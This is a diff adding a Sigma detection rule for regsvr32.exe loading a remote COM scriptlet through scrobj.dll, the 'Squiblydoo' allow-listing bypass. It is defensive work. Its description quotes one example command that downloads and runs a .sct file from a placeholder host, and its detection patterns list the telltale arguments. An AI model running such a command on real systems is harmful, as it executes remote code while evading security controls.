@@ -1,0 +1,37 @@
+title: Regsvr32 Loading Scriptlet Via Scrobj.dll (Squiblydoo)
+id: b01cf729-c18a-4ddf-8b88-543b67545efd
+status: test
+description: |
+  Detects regsvr32.exe called with the /i: switch together with scrobj.dll, a .sct scriptlet,
+  or a URL, e.g. "regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll". This "Squiblydoo"
+  technique makes the signed regsvr32.exe download and run a COM scriptlet, bypassing
+  application allow-listing. Normal regsvr32 use registers a local DLL and does not combine
+  /i: with scrobj.dll or a remote location.
+references:
+  - https://attack.mitre.org/techniques/T1218/010/
+  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
+author: Aryan Dhuru
+date: 2026-10-14
+tags:
+  - attack.stealth
+  - attack.t1218.010
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_img:
+    - Image|endswith: '\regsvr32.exe'
+    - OriginalFileName: 'REGSVR32.EXE'
+  selection_flag:
+    CommandLine|windash|contains: ' /i:'
+  selection_payload:
+    CommandLine|contains:
+      - 'scrobj'
+      - '.sct'
+      - 'http://'
+      - 'https://'
+      - 'ftp://'
+  condition: all of selection_*
+falsepositives:
+  - Rare. Some legacy installers pass /i: with an install argument; those reference a local DLL, not scrobj.dll or a URL.
+level: high
